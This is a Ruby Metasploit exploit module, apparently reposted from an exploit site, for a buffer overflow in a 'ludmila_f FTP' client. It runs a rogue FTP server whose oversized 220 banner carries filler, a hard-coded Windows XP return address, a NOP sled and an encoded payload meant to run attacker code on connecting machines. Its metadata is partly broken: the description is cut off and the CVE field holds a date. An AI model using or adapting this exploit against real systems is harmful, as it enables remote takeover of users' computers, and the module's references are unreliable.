# $Id: ludmila_f_FTP.rb 16847 2011-09-07 03:30:45Z Iraq $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::TcpServer
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;ludmila_f FTP Remote Buffer Overflow Exploit&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a buffer overflow in the ludmila_f FTP
               
            },
            &#039;Author&#039;     => [ &#039;Angel Injection&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;7/9/2011&#039; ],
                    [ &#039;OSVDB&#039;, &#039;16847&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.1337day.com/exploits/16847&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;seh&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 1500,
                    &#039;BadChars&#039; => "\x00\x0a\x0d\x20",
                    &#039;StackAdjustment&#039; => -3600,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    # Tested against - XP SP3 English OK.
                    [ &#039;Universal&#039;,  { &#039;Ret&#039; => 0x7609e405 } ], # WCMDPA10 (part of ludmila_f FTP)
                ],
            &#039;Privileged&#039;     => false,
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;7/9/2011&#039;))
 
        register_options(
            [
                OptPort.new(&#039;SRVPORT&#039;, [ true, "The FTP daemon port to listen on", 21 ]),
            ], self.class)
    end
 
    def on_client_connect(client)
        return if ((p = regenerate_payload(client)) == nil)
 
        buffer =  "220 "
        buffer << rand_text_numeric(2064)
        buffer << [target.ret].pack(&#039;V&#039;)
        buffer << make_nops(20)
        buffer << payload.encoded
        buffer << "\r\n"
        client.put(buffer)
    end
 
end 



